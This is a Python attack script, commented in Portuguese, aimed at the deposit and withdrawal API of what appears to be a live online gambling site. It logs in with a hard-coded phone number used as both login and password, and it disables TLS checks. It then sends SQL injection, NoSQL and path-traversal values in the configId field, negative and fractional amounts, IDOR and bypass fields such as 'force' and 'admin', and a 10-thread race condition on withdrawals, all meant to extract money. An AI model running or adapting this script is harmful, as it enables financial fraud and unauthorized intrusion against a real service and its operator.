"""
testar_dep_saque.py
===================
Testa vetores de ataque específicos em depósito e saque.

FLUXO:
  1. Login → token fresco
  2. Captura estrutura COMPLETA de depósito (todos os campos)
  3. Captura estrutura COMPLETA de saque
  4. Testa vetores que AINDA não foram confirmados:
     - configId manipulation (campo nunca explorado)
     - Parâmetros extras no body (campos não documentados)
     - Saque sem depósito prévio (amount > saldo)
     - Saque com dados bancários de outro user
     - Race condition refinada (10 threads simultâneos)
     - Saque com amount fracionado (ex: 0.01)
     - Campos de resposta do saque (orderId, etc) — tentativa de replay
"""
import ssl, urllib.request, urllib.error, json, time, threading
from datetime import datetime, timezone

ctx = ssl.create_default_context()
ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
BASE  = "https://ds.amizade777.com"
PHONE = "21998498419"
DID   = "0beb614f-8838-43ef-00fc-0029f7d5d20f"
PKG   = "com.slots.big"

RESULTS = []

def req(method, path, body=None, token=None, extra_headers=None):
    h = {"User-Agent":"Mozilla/5.0","Accept":"application/json, */*",
         "Origin":BASE,"Referer":BASE+"/"}
    if body is not None: h["Content-Type"] = "application/json"
    if token: h["Token"] = str(token)
    if extra_headers: h.update(extra_headers)
    data = json.dumps(body).encode() if body is not None else None
    try:
        r = urllib.request.Request(BASE+path, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=12, context=ctx) as resp:
            raw = resp.read(16384).decode("utf-8","ignore")
            try: return resp.status, dict(resp.headers), json.loads(raw)
            except: return resp.status, dict(resp.headers), {"_raw": raw[:600]}
    except urllib.error.HTTPError as e:
        raw = e.read(8192).decode("utf-8","ignore") if e.fp else ""
        try: return e.code, {}, json.loads(raw)
        except: return e.code, {}, {"_raw": raw[:400]}
    except Exception as ex:
        return 0, {}, {"err": str(ex)}

def login():
    pl = {"appChannel":"pc","appPackageName":PKG,"deviceId":DID,
          "deviceModel":"WEB","deviceVersion":"WEB","appVersion":"1.0.0",
          "sysTimezone":None,"sysLanguage":None,"phone":PHONE,"password":PHONE}
    st,_,b = req("POST", "/prod-api/player/sign-in", pl)
    if b.get("code") != 200: raise RuntimeError(f"Login falhou: {b.get('msg')}")
    return b["data"]["token"], b["data"]["user_info"], b["data"]

def rec(cat, test, rq, rs, interp, sev="info"):
    icons = {"critical":"🔴","high":"🟠","medium":"🟡","low":"🔵","info":"⚪"}
    e = {"ts":datetime.now(timezone.utc).isoformat(),"cat":cat,"test":test,
         "rq":rq,"rs":rs,"interp":interp,"sev":sev}
    RESULTS.append(e)
    code = rs.get("code","?") if isinstance(rs,dict) else "?"
    msg  = str(rs.get("msg",""))[:60] if isinstance(rs,dict) else ""
    print(f"  {icons.get(sev,'⚪')} [{cat}/{test[:55]}] code={code} msg={msg!r}")
    if sev in ("critical","high"): print(f"     ↪ {interp}")

# ═══════════════════════════════════════════════════
# PASSO 1: Capturar estrutura COMPLETA do depósito
# ═══════════════════════════════════════════════════

print("=" * 60)
print("1. ESTRUTURA COMPLETA DO DEPÓSITO")
print("=" * 60)

token, ui, full_data = login()
print(f"Token: {token}")
print(f"Saldo atual: recharge={ui.get('recharge_amount')} withdraw={ui.get('withdraw_amount')}")
print(f"withdraw_model: {ui.get('withdraw_model')} withdraw_control: {ui.get('withdraw_control')}")

# Ver quais canais de pagamento existem
st, _, b = req("GET", "/prod-api/pay-service/bank", token=token)
print(f"\nCanais de pagamento (bank): code={b.get('code')}")
if b.get("code") == 200 and b.get("data"):
    print(json.dumps(b["data"], ensure_ascii=False, indent=2)[:1000])

st, _, b = req("POST", "/prod-api/pay-service/bank", {}, token=token)
print(f"POST bank: code={b.get('code')} data={b.get('data')}")

# Ver config de recharge (quais configIds existem)
st, _, b = req("GET", "/prod-api/global-config/recharge", token=token)
print(f"\nGlobal recharge config: code={b.get('code')}")
if b.get("code") == 200:
    print(json.dumps(b.get("data"), ensure_ascii=False, indent=2)[:800])

# Ver recharge-list (histórico de depósitos)
st, _, b = req("GET", "/prod-api/pay-service/recharge-list", token=token)
print(f"\nHistórico de depósitos: code={b.get('code')}")
if b.get("code") == 200:
    data = b.get("data") or {}
    print(json.dumps(data, ensure_ascii=False, indent=2)[:800])

# ═══════════════════════════════════════════════════
# PASSO 2: Testar depósito — vetores não testados
# ═══════════════════════════════════════════════════

print("\n" + "=" * 60)
print("2. DEPÓSITO — VETORES NÃO TESTADOS")
print("=" * 60)

# Base payload do recharge (com token no body — descoberta da sessão anterior)
base_recharge = {
    "token": None,  # será preenchido
    "appPackageName": PKG,
    "appVersion": "1.0.0",
    "phone": PHONE,
    "configId": "",
    "amount": 20,
    "qr": 1
}

# ── 2A. configId manipulation ──────────────────────────────
print("\n  2A. configId manipulation")

config_ids_to_test = [
    ("vazio",         ""),
    ("zero",          "0"),
    ("um",            "1"),
    ("dois",          "2"),
    ("admin",         "admin"),
    ("minus_1",       "-1"),
    ("null_str",      "null"),
    ("nosql",         {"$ne": ""}),
    ("array",         ["1","2"]),
    ("longo",         "A" * 100),
    ("path_traversal","../admin"),
    ("sql_injection",  "1' OR '1'='1"),
]

for label, cfg_id in config_ids_to_test:
    tok, _, _ = login()
    payload = dict(base_recharge, token=tok, configId=cfg_id)
    st, _, b = req("POST", "/prod-api/pay-service/recharge", payload, tok)
    code = b.get("code"); msg = str(b.get("msg",""))[:50]
    # Anormal se code não for 103012 (valor inválido) ou 103014 (sem canal)
    is_interesting = code not in (103012, 103014, 400, 401, 403, 404)
    if is_interesting or code == 200:
        rec("recharge", f"configId={label}",
            {"configId": str(cfg_id)[:50]},
            {"code": code, "msg": msg, "data": b.get("data")},
            f"configId={label!r} → code={code}",
            "high" if code == 200 else "medium")
    else:
        print(f"    [{label}] code={code} msg={msg!r}")
    time.sleep(0.5)

# ── 2B. Campos extras no body do recharge ─────────────────
print("\n  2B. Campos extras no body")

extra_fields_tests = [
    ("amount_string",  {"amount": "20"}),
    ("amount_float",   {"amount": 20.5}),
    ("amount_neg_frac",{"amount": -0.01}),
    ("qr_zero",        {"amount": 20, "qr": 0}),
    ("qr_dois",        {"amount": 20, "qr": 2}),
    ("type_pix",       {"amount": 20, "qr": 1, "type": "PIX"}),
    ("type_transfer",  {"amount": 20, "qr": 1, "type": "transfer"}),
    ("channel_fake",   {"amount": 20, "qr": 1, "channel": "fake_channel"}),
    ("bank_code",      {"amount": 20, "qr": 1, "bankCode": "001"}),
    ("user_id_1",      {"amount": 20, "qr": 1, "user_id": 1}),
    ("promo_code",     {"amount": 20, "qr": 1, "promoCode": "HACK100"}),
    ("bonus_flag",     {"amount": 20, "qr": 1, "bonusFlag": 1}),
    ("no_verify",      {"amount": 20, "qr": 1, "skipVerify": True}),
]

baseline_code = None
for label, extra in extra_fields_tests:
    tok, _, _ = login()
    payload = dict(base_recharge, token=tok)
    payload.update(extra)
    st, _, b = req("POST", "/prod-api/pay-service/recharge", payload, tok)
    code = b.get("code"); msg = str(b.get("msg",""))[:50]
    if baseline_code is None: baseline_code = code
    # Interessante se o código mudou em relação ao baseline
    changed = (code != baseline_code)
    if changed or code == 200:
        rec("recharge", f"extra_{label}",
            {"extra": extra},
            {"code": code, "msg": msg, "orderId": b.get("data",{}).get("orderId") if isinstance(b.get("data"),dict) else None},
            f"Comportamento diferente do baseline! code={code} (baseline={baseline_code})",
            "high" if code == 200 else "medium")
    else:
        print(f"    [{label}] code={code} ={baseline_code}")
    time.sleep(0.5)

# ═══════════════════════════════════════════════════
# PASSO 3: Estrutura do saque + vetores
# ═══════════════════════════════════════════════════

print("\n" + "=" * 60)
print("3. SAQUE — ESTRUTURA E VETORES")
print("=" * 60)

tok, ui2, _ = login()

# 3A. Ver histórico de saques
st, _, b = req("GET", "/prod-api/payment/balance-less/list", token=tok)
print(f"Histórico de saques (GET): code={b.get('code')}")
if b.get("code") == 200:
    print(json.dumps(b.get("data"), ensure_ascii=False, indent=2)[:600])

st, _, b = req("POST", "/prod-api/payment/balance-less/list", {}, token=tok)
print(f"Histórico de saques (POST): code={b.get('code')}")
if b.get("code") == 200:
    print(json.dumps(b.get("data"), ensure_ascii=False, indent=2)[:600])

# 3B. Ver configuração de saque
st, _, b = req("GET", "/prod-api/pay-service/withdraw-limit", token=tok)
print(f"\nLimite de saque: code={b.get('code')}")
if b.get("code") == 200:
    print(json.dumps(b.get("data"), ensure_ascii=False, indent=2)[:600])

# 3C. Ver dados bancários cadastrados
st, _, b = req("POST", "/prod-api/pay-service/bank", {}, token=tok)
print(f"\nDados bancários: code={b.get('code')}")
if b.get("code") == 200 and b.get("data"):
    print(json.dumps(b.get("data"), ensure_ascii=False, indent=2)[:600])

# 3D. Testa saque — todos os vetores
print("\n  3D. VETORES DE SAQUE")

base_withdraw = {
    "token": None,
    "appPackageName": PKG,
    "appVersion": "1.0.0",
    "phone": PHONE,
}

withdraw_tests = [
    # Valores anômalos
    ("amount_neg",        {"amount": -50}),
    ("amount_zero",       {"amount": 0}),
    ("amount_frac",       {"amount": 0.01}),
    ("amount_frac2",      {"amount": 49.99}),
    ("amount_max",        {"amount": 999999}),
    ("amount_neg_frac",   {"amount": -0.01}),
    ("amount_string",     {"amount": "50"}),
    ("amount_array",      {"amount": [-50, 50]}),
    ("amount_nosql",      {"amount": {"$ne": 0}}),
    ("amount_null",       {"amount": None}),
    # Campos extras
    ("user_id_1_idor",    {"amount": 50, "user_id": 1}),
    ("toUserId",          {"amount": 50, "toUserId": 1}),
    ("bank_idor",         {"amount": 50, "bankId": 1}),
    ("bank_account_fake", {"amount": 50, "bankAccount": "00000000000",
                           "bankName": "Banco Fake", "accountType": "cpf"}),
    ("skip_rounds",       {"amount": 50, "skipRounds": True, "total_rounds": 999}),
    ("force_withdraw",    {"amount": 50, "force": True, "admin": True}),
    ("type_transfer",     {"amount": 50, "type": "transfer", "targetAccount": PHONE}),
    ("withdraw_control_bypass", {"amount": 50, "withdraw_control": 1}),
    # Race condition setup: 10 simultâneos
]

for label, extra in withdraw_tests:
    tok, _, _ = login()
    payload = dict(base_withdraw, token=tok)
    payload.update(extra)
    st, _, b = req("POST", "/prod-api/payment/balance-less", payload, tok)
    code = b.get("code"); msg = str(b.get("msg",""))[:60]

    # Novo código que nunca vimos nos testes anteriores
    already_seen = {103012, 103014, 103003, 400, 401, 403, 404, 405,
                    102008, 102009, 500, 0}
    is_new = code not in already_seen
    if code == 200 or is_new:
        rec("withdraw", label,
            {"payload_extra": extra},
            {"code": code, "msg": msg, "data": b.get("data")},
            f"Código {'200 ACEITO' if code==200 else 'NOVO: '+str(code)}!",
            "critical" if code == 200 else "medium")
    else:
        print(f"    [{label}] code={code} msg={msg!r}")
    time.sleep(0.5)

# ── 3E. Race condition refinada (10 threads) ──────────────
print("\n  3E. RACE CONDITION REFINADA (10 threads)")

tok_race, _, _ = login()
results_race = []
lock = threading.Lock()

def race_withdraw(n):
    payload = dict(base_withdraw, token=tok_race, amount=10)
    st, _, b = req("POST", "/prod-api/payment/balance-less", payload, tok_race)
    with lock:
        results_race.append({"n":n, "code":b.get("code"), "msg":b.get("msg","")})

threads = [threading.Thread(target=race_withdraw, args=(i,)) for i in range(10)]
for t in threads: t.start()
for t in threads: t.join(timeout=20)

accepted = [r for r in results_race if r["code"] == 200]
print(f"  {len(results_race)} respostas | {len(accepted)} aceitas")
for r in results_race:
    icon = "🔴" if r["code"]==200 else "⚪"
    print(f"  {icon} Thread {r['n']}: code={r['code']} msg={r['msg']!r}")
if len(accepted) >= 2:
    rec("withdraw", "race_condition_10x",
        {"threads": 10},
        {"accepted": len(accepted), "results": results_race},
        f"RACE CONDITION! {len(accepted)} de 10 aceitos!",
        "critical")

# ═══════════════════════════════════════════════════
# Resumo
# ═══════════════════════════════════════════════════

with open("dep_saque_resultados.json","w",encoding="utf-8") as f:
    json.dump(RESULTS, f, ensure_ascii=False, indent=2, default=str)

crits = [e for e in RESULTS if e["sev"] in ("critical","high","medium")]
print(f"\n{'='*60}")
print(f"RESUMO: {len(crits)} achados relevantes de {len(RESULTS)} total")
for e in crits:
    icons = {"critical":"🔴","high":"🟠","medium":"🟡"}
    print(f"  {icons.get(e['sev'],'?')} {e['cat']}/{e['test'][:60]}")
    print(f"    {e['interp'][:100]}")

print(f"\n✅ dep_saque_resultados.json")
